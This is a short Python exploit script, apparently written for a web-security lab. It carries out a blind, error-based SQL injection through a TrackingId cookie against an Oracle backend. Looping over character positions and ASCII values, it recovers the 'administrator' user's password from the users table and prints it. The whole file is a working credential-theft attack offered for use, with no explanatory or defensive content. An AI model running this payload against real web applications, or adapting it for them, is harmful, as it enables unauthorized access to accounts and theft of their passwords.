import sys, requests, urllib3, urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def get_admin_password(url):
    trackingId = "O0T0sujZVFc8hXt8"
    session = "68NCPDsFF5CTKp8U3H5dhpdTH2jDCqLY"
    password = ""
    for i in range(1,21):
        for j in range(32,126):
            payload = "' AND (SELECT CASE WHEN (SELECT ascii(SUBSTR(password,%s,1)) FROM users WHERE username = 'administrator')='%s' THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a'--" % (i,j)
            encoded_payload = urllib.parse.quote(payload)
            cookies = {'TrackingId': trackingId + encoded_payload, 'session': session}
            response = requests.get(url, cookies=cookies, verify=False)

            if 'Internal Server Error' not in response.text:
                sys.stdout.write('\r' + password + chr(j))
                sys.stdout.flush()
            else:
                password += chr(j)
                sys.stdout.write('\r' + password)
                sys.stdout.flush()
                break
    print("pass is: ", password)


def main():
    if len(sys.argv) != 2:
        print("[-] Invalid Usage!")

    url = sys.argv[1]
    print("[+] Retrieving administrator password...")
    get_admin_password(url)

if __name__ == "__main__":
    main()